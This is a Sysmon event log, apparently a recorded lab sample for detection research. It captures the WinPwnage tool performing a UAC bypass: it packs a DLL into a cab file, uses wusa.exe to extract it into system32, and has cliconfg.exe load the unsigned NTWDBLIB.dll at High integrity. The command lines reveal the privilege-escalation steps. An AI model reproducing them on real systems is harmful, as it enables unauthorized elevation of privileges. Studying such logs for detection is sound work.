<root>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385F-C22A-43E0-BF4C-06F5698FFBD9}" />
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime="2019-05-10T13:49:29.586782100Z" />
      <EventRecordID>15705</EventRecordID>
      <Correlation />
      <Execution ProcessID="1980" ThreadID="1948" />
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>IEWIN7</Computer>
      <Security UserID="S-1-5-18" />
    </System>
    <EventData>
      <Data Name="RuleName">
      </Data>
      <Data Name="UtcTime">2019-05-10 13:49:29.586</Data>
      <Data Name="ProcessGuid">{365ABB72-8169-5CD5-0000-0010D7982300}</Data>
      <Data Name="ProcessId">3552</Data>
      <Data Name="Image">C:\Python27\python.exe</Data>
      <Data Name="FileVersion">?</Data>
      <Data Name="Description">?</Data>
      <Data Name="Product">?</Data>
      <Data Name="Company">?</Data>
      <Data Name="CommandLine">python  winpwnage.py -u uac -i 11 -p c:\Users\IEUser\Desktop\hellox86.dll</Data>
      <Data Name="CurrentDirectory">C:\Users\IEUser\Downloads\WinPwnage-master\WinPwnage-master\</Data>
      <Data Name="User">IEWIN7\IEUser</Data>
      <Data Name="LogonGuid">{365ABB72-79DF-5CD5-0000-002041420100}</Data>
      <Data Name="LogonId">0x14241</Data>
      <Data Name="TerminalSessionId">1</Data>
      <Data Name="IntegrityLevel">Medium</Data>
      <Data Name="Hashes">SHA1=ECA93AAAA5039E12D2F0CC3F0C8F5AF8FDB15C71,MD5=E11683E4A1E88666DD5E0331F969E0C6,SHA256=B6B4BD10303797C209C4F3C3FCC863A925A77AE2C38090FB8B3FF1BF9C4DDE84,IMPHASH=F3F3DE6C332CF6049756A5B794EBD0C5</Data>
      <Data Name="ParentProcessGuid">{365ABB72-7AEA-5CD5-0000-001021480A00}</Data>
      <Data Name="ParentProcessId">332</Data>
      <Data Name="ParentImage">C:\Windows\System32\cmd.exe</Data>
      <Data Name="ParentCommandLine">"C:\Windows\system32\cmd.exe" </Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385F-C22A-43E0-BF4C-06F5698FFBD9}" />
      <EventID>11</EventID>
      <Version>2</Version>
      <Level>4</Level>
      <Task>11</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime="2019-05-10T13:49:29.789907100Z" />
      <EventRecordID>15706</EventRecordID>
      <Correlation />
      <Execution ProcessID="1980" ThreadID="1948" />
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>IEWIN7</Computer>
      <Security UserID="S-1-5-18" />
    </System>
    <EventData>
      <Data Name="RuleName">
      </Data>
      <Data Name="UtcTime">2019-05-10 13:49:29.789</Data>
      <Data Name="ProcessGuid">{365ABB72-8169-5CD5-0000-0010D7982300}</Data>
      <Data Name="ProcessId">3552</Data>
      <Data Name="Image">c:\python27\python.exe</Data>
      <Data Name="TargetFilename">C:\Users\IEUser\AppData\Local\Temp\NTWDBLIB.dll</Data>
      <Data Name="CreationUtcTime">2019-05-10 13:49:29.789</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385F-C22A-43E0-BF4C-06F5698FFBD9}" />
      <EventID>11</EventID>
      <Version>2</Version>
      <Level>4</Level>
      <Task>11</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime="2019-05-10T13:49:34.946157100Z" />
      <EventRecordID>15707</EventRecordID>
      <Correlation />
      <Execution ProcessID="1980" ThreadID="1948" />
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>IEWIN7</Computer>
      <Security UserID="S-1-5-18" />
    </System>
    <EventData>
      <Data Name="RuleName">
      </Data>
      <Data Name="UtcTime">2019-05-10 13:49:34.899</Data>
      <Data Name="ProcessGuid">{365ABB72-816E-5CD5-0000-0010FEB62300}</Data>
      <Data Name="ProcessId">1700</Data>
      <Data Name="Image">C:\Windows\System32\makecab.exe</Data>
      <Data Name="TargetFilename">C:\Users\IEUser\AppData\Local\Temp\suspicious.cab</Data>
      <Data Name="CreationUtcTime">2019-05-10 13:49:34.899</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385F-C22A-43E0-BF4C-06F5698FFBD9}" />
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime="2019-05-10T13:49:39.930532100Z" />
      <EventRecordID>15708</EventRecordID>
      <Correlation />
      <Execution ProcessID="1980" ThreadID="1948" />
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>IEWIN7</Computer>
      <Security UserID="S-1-5-18" />
    </System>
    <EventData>
      <Data Name="RuleName">
      </Data>
      <Data Name="UtcTime">2019-05-10 13:49:39.836</Data>
      <Data Name="ProcessGuid">{365ABB72-8173-5CD5-0000-00102FCD2300}</Data>
      <Data Name="ProcessId">3608</Data>
      <Data Name="Image">C:\Windows\System32\wusa.exe</Data>
      <Data Name="FileVersion">6.1.7600.16385 (win7_rtm.090713-1255)</Data>
      <Data Name="Description">Windows Update Standalone Installer</Data>
      <Data Name="Product">Microsoft« Windows« Operating System</Data>
      <Data Name="Company">Microsoft Corporation</Data>
      <Data Name="CommandLine">"C:\Windows\System32\wusa.exe" c:\users\ieuser\appdata\local\temp\suspicious.cab /extract:C:\Windows\system32 /quiet</Data>
      <Data Name="CurrentDirectory">C:\Users\IEUser\Downloads\WinPwnage-master\WinPwnage-master\</Data>
      <Data Name="User">IEWIN7\IEUser</Data>
      <Data Name="LogonGuid">{365ABB72-79DF-5CD5-0000-002041420100}</Data>
      <Data Name="LogonId">0x14241</Data>
      <Data Name="TerminalSessionId">1</Data>
      <Data Name="IntegrityLevel">Medium</Data>
      <Data Name="Hashes">SHA1=B94D16ED6A439CFE591E7A20627F3033E71A10E2,MD5=8CBD6FDACDCC0ED48BAF607226D6D0C9,SHA256=CB128FAF0430CE1A90412546E90A3B6446C74887D696485CC2C3AAF10714A428,IMPHASH=DDC91ECD17D943E2EE26D62FC9A4FB0C</Data>
      <Data Name="ParentProcessGuid">{365ABB72-8169-5CD5-0000-0010D7982300}</Data>
      <Data Name="ParentProcessId">3552</Data>
      <Data Name="ParentImage">C:\Python27\python.exe</Data>
      <Data Name="ParentCommandLine">python  winpwnage.py -u uac -i 11 -p c:\Users\IEUser\Desktop\hellox86.dll</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385F-C22A-43E0-BF4C-06F5698FFBD9}" />
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime="2019-05-10T13:49:40.164907100Z" />
      <EventRecordID>15709</EventRecordID>
      <Correlation />
      <Execution ProcessID="1980" ThreadID="1948" />
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>IEWIN7</Computer>
      <Security UserID="S-1-5-18" />
    </System>
    <EventData>
      <Data Name="RuleName">
      </Data>
      <Data Name="UtcTime">2019-05-10 13:49:40.008</Data>
      <Data Name="ProcessGuid">{365ABB72-8174-5CD5-0000-0010ABE62300}</Data>
      <Data Name="ProcessId">2676</Data>
      <Data Name="Image">C:\Windows\System32\wusa.exe</Data>
      <Data Name="FileVersion">6.1.7600.16385 (win7_rtm.090713-1255)</Data>
      <Data Name="Description">Windows Update Standalone Installer</Data>
      <Data Name="Product">Microsoft« Windows« Operating System</Data>
      <Data Name="Company">Microsoft Corporation</Data>
      <Data Name="CommandLine">"C:\Windows\System32\wusa.exe" c:\users\ieuser\appdata\local\temp\suspicious.cab /extract:C:\Windows\system32 /quiet</Data>
      <Data Name="CurrentDirectory">C:\Windows\system32\</Data>
      <Data Name="User">IEWIN7\IEUser</Data>
      <Data Name="LogonGuid">{365ABB72-79DF-5CD5-0000-0020F8410100}</Data>
      <Data Name="LogonId">0x141f8</Data>
      <Data Name="TerminalSessionId">1</Data>
      <Data Name="IntegrityLevel">High</Data>
      <Data Name="Hashes">SHA1=B94D16ED6A439CFE591E7A20627F3033E71A10E2,MD5=8CBD6FDACDCC0ED48BAF607226D6D0C9,SHA256=CB128FAF0430CE1A90412546E90A3B6446C74887D696485CC2C3AAF10714A428,IMPHASH=DDC91ECD17D943E2EE26D62FC9A4FB0C</Data>
      <Data Name="ParentProcessGuid">{365ABB72-8169-5CD5-0000-0010D7982300}</Data>
      <Data Name="ParentProcessId">3552</Data>
      <Data Name="ParentImage">C:\Python27\python.exe</Data>
      <Data Name="ParentCommandLine">python  winpwnage.py -u uac -i 11 -p c:\Users\IEUser\Desktop\hellox86.dll</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385F-C22A-43E0-BF4C-06F5698FFBD9}" />
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime="2019-05-10T13:49:45.133657100Z" />
      <EventRecordID>15710</EventRecordID>
      <Correlation />
      <Execution ProcessID="1980" ThreadID="1948" />
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>IEWIN7</Computer>
      <Security UserID="S-1-5-18" />
    </System>
    <EventData>
      <Data Name="RuleName">
      </Data>
      <Data Name="UtcTime">2019-05-10 13:49:45.039</Data>
      <Data Name="ProcessGuid">{365ABB72-8179-5CD5-0000-00102CFF2300}</Data>
      <Data Name="ProcessId">1052</Data>
      <Data Name="Image">C:\Windows\System32\cliconfg.exe</Data>
      <Data Name="FileVersion">6.1.7600.16385 (win7_rtm.090713-1255)</Data>
      <Data Name="Description">SQL Client Configuration Utility EXE</Data>
      <Data Name="Product">Microsoft« Windows« Operating System</Data>
      <Data Name="Company">Microsoft Corporation</Data>
      <Data Name="CommandLine">"C:\Windows\system32\cliconfg.exe" </Data>
      <Data Name="CurrentDirectory">C:\Users\IEUser\Downloads\WinPwnage-master\WinPwnage-master\</Data>
      <Data Name="User">IEWIN7\IEUser</Data>
      <Data Name="LogonGuid">{365ABB72-79DF-5CD5-0000-002041420100}</Data>
      <Data Name="LogonId">0x14241</Data>
      <Data Name="TerminalSessionId">1</Data>
      <Data Name="IntegrityLevel">Medium</Data>
      <Data Name="Hashes">SHA1=EC95A168D8C1A63A49CFE69155DE1DFD7E9DEB10,MD5=A864C416E467FFA3DEAE4EFACF58F9D7,SHA256=BE756153F3321DE856329FDF3CB87528333D6041400A25B2EBB1F8276BCA6733,IMPHASH=8AE23C0E23439B8F59A5785B5EFD4855</Data>
      <Data Name="ParentProcessGuid">{365ABB72-8169-5CD5-0000-0010D7982300}</Data>
      <Data Name="ParentProcessId">3552</Data>
      <Data Name="ParentImage">C:\Python27\python.exe</Data>
      <Data Name="ParentCommandLine">python  winpwnage.py -u uac -i 11 -p c:\Users\IEUser\Desktop\hellox86.dll</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385F-C22A-43E0-BF4C-06F5698FFBD9}" />
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime="2019-05-10T13:49:45.378774200Z" />
      <EventRecordID>15711</EventRecordID>
      <Correlation />
      <Execution ProcessID="1980" ThreadID="1948" />
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>IEWIN7</Computer>
      <Security UserID="S-1-5-18" />
    </System>
    <EventData>
      <Data Name="RuleName">
      </Data>
      <Data Name="UtcTime">2019-05-10 13:49:45.196</Data>
      <Data Name="ProcessGuid">{365ABB72-8179-5CD5-0000-001083182400}</Data>
      <Data Name="ProcessId">880</Data>
      <Data Name="Image">C:\Windows\System32\cliconfg.exe</Data>
      <Data Name="FileVersion">6.1.7600.16385 (win7_rtm.090713-1255)</Data>
      <Data Name="Description">SQL Client Configuration Utility EXE</Data>
      <Data Name="Product">Microsoft« Windows« Operating System</Data>
      <Data Name="Company">Microsoft Corporation</Data>
      <Data Name="CommandLine">"C:\Windows\system32\cliconfg.exe" </Data>
      <Data Name="CurrentDirectory">C:\Windows\system32\</Data>
      <Data Name="User">IEWIN7\IEUser</Data>
      <Data Name="LogonGuid">{365ABB72-79DF-5CD5-0000-0020F8410100}</Data>
      <Data Name="LogonId">0x141f8</Data>
      <Data Name="TerminalSessionId">1</Data>
      <Data Name="IntegrityLevel">High</Data>
      <Data Name="Hashes">SHA1=EC95A168D8C1A63A49CFE69155DE1DFD7E9DEB10,MD5=A864C416E467FFA3DEAE4EFACF58F9D7,SHA256=BE756153F3321DE856329FDF3CB87528333D6041400A25B2EBB1F8276BCA6733,IMPHASH=8AE23C0E23439B8F59A5785B5EFD4855</Data>
      <Data Name="ParentProcessGuid">{365ABB72-8169-5CD5-0000-0010D7982300}</Data>
      <Data Name="ParentProcessId">3552</Data>
      <Data Name="ParentImage">C:\Python27\python.exe</Data>
      <Data Name="ParentCommandLine">python  winpwnage.py -u uac -i 11 -p c:\Users\IEUser\Desktop\hellox86.dll</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385F-C22A-43E0-BF4C-06F5698FFBD9}" />
      <EventID>7</EventID>
      <Version>3</Version>
      <Level>4</Level>
      <Task>7</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime="2019-05-10T13:49:45.387563300Z" />
      <EventRecordID>15712</EventRecordID>
      <Correlation />
      <Execution ProcessID="1980" ThreadID="1948" />
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>IEWIN7</Computer>
      <Security UserID="S-1-5-18" />
    </System>
    <EventData>
      <Data Name="RuleName">
      </Data>
      <Data Name="UtcTime">2019-05-10 13:49:45.227</Data>
      <Data Name="ProcessGuid">{365ABB72-8179-5CD5-0000-001083182400}</Data>
      <Data Name="ProcessId">880</Data>
      <Data Name="Image">C:\Windows\System32\cliconfg.exe</Data>
      <Data Name="ImageLoaded">C:\Windows\System32\NTWDBLIB.dll</Data>
      <Data Name="FileVersion">?</Data>
      <Data Name="Description">?</Data>
      <Data Name="Product">?</Data>
      <Data Name="Company">?</Data>
      <Data Name="Hashes">SHA1=AA3BF7118AE8138859FC0EE9202684C6DA22C176,MD5=3F090AA1CAE8B179F93B2064B8609AE2,SHA256=AC1DD32C41F6002BDF2EB564653FF23E069594CE55F9E22093355084EE28A6FD,IMPHASH=10D8CBCC4D9E244D697F1C09224856DC</Data>
      <Data Name="Signed">false</Data>
      <Data Name="Signature">
      </Data>
      <Data Name="SignatureStatus">Unavailable</Data>
    </EventData>
  </Event>
</root>